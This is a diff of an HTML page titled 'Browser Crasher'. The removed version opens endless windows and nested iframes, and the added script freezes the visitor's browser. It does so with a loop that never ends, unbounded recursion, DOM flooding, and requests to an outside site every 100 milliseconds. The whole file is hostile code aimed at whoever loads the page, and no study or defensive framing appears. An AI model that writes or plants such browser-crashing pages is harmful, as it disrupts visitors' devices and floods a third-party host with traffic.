@@ -1,27 +1,103 @@
 <!DOCTYPE html>
-<script>
-    for (var i = 0; i < Infinity; i++) {
-        var url = 'https://www.urmom.com';
-        var win = window.open();
-        win.document.body.style.margin = '0';
-        win.document.body.style.height = '100vh';
-        var iframe = win.document.createElement('iframe');
-        iframe.style.border = 'none';
-        iframe.style.width = '100%';
-        iframe.style.height = '100%';
-        iframe.style.margin = '0';
-        iframe.src = url;
-        win.document.body.appendChild(iframe);
-
-        for (var j = 0; j < Infinity; j++) {
-            var nestedIframe = win.document.createElement('iframe');
-            nestedIframe.style.border = 'none';
-            nestedIframe.style.width = '100%';
-            nestedIframe.style.height = '100%';
-            nestedIframe.style.margin = '0';
-            nestedIframe.src = url;
-            win.document.body.appendChild(nestedIframe);
+<html>
+<head>
+    <title>Browser Crasher</title>
+</head>
+<body>
+    <script>
+        // Function to generate a large array of random numbers
+        function generateDataArray(size) {
+            var dataArray = [];
+            for (var i = 0; i < size; i++) {
+                dataArray.push(Math.random());
+            }
+            return dataArray;
         }
-    }
-</script>
+
+        // Function to perform heavy data processing
+        function processData() {
+            // Define the size of the data array
+            var arraySize = 1000000; // Adjust this value as needed for your desired level of intensity
+
+            // Generate a large array of random numbers
+            var data = generateDataArray(arraySize);
+
+            // Perform complex computations or operations with the data
+            // For demonstration purposes, let's calculate the sum of all numbers
+            var sum = 0;
+            for (var i = 0; i < data.length; i++) {
+                sum += data[i];
+            }
+
+            // Display the result (optional)
+            console.log('Sum of data array:', sum);
+        }
+
+        // Function to create an infinite loop
+        function infiniteLoop() {
+            while (true) {
+                // This loop will run indefinitely, consuming system resources
+            }
+        }
+
+        // Function to perform recursive function calls
+        function recursiveFunction() {
+            // Call itself recursively
+            recursiveFunction();
+        }
+
+        // Function to perform DOM manipulation
+        function manipulateDOM() {
+            // Create a new element and append it to the body
+            var newElement = document.createElement('div');
+            newElement.textContent = 'DOM manipulation at its finest!';
+            document.body.appendChild(newElement);
+            
+            // Create additional elements and manipulate the DOM further
+            for (var i = 0; i < 100; i++) {
+                var newParagraph = document.createElement('p');
+                newParagraph.textContent = 'This is paragraph ' + i;
+                document.body.appendChild(newParagraph);
+            }
+        }
+
+        // Function to make relentless AJAX requests
+        function makeAjaxRequests() {
+            // Send continuous AJAX requests to external sources
+            setInterval(function() {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://urmom.com', true); // Replace 'https://example.com' with your desired URL
+                xhr.send();
+            }, 100); // Adjust the interval as needed (milliseconds)
+        }
+
+        // Additional lag-inducing operations
+        function induceLag() {
+            // Insert additional heavy operations here
+            // For example, complex calculations or manipulations
+            for (var i = 0; i < 1000; i++) {
+                Math.random(); // Intensive computation
+            }
+        }
+
+        // Call the processData function
+        processData();
+
+        // Call the infiniteLoop function
+        infiniteLoop();
+
+        // Call the recursiveFunction function
+        recursiveFunction();
+
+        // Call the manipulateDOM function
+        manipulateDOM();
+
+        // Call the makeAjaxRequests function
+        makeAjaxRequests();
+
+        // Call the induceLag function
+        induceLag();
+    </script>
+</body>
+</html>
 
